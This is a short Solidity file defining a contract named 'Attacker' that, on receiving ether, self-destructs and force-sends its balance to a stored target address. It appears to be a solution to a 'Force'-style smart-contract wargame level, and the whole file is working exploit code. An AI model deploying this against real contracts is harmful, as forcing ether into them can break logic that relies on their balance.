// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attacker {
    
    address attackedContractAddress;

    constructor(address _forceContractAddress) {
        attackedContractAddress = _forceContractAddress;
    }

    receive() external payable {
        selfdestruct(payable(attackedContractAddress));
    } 

}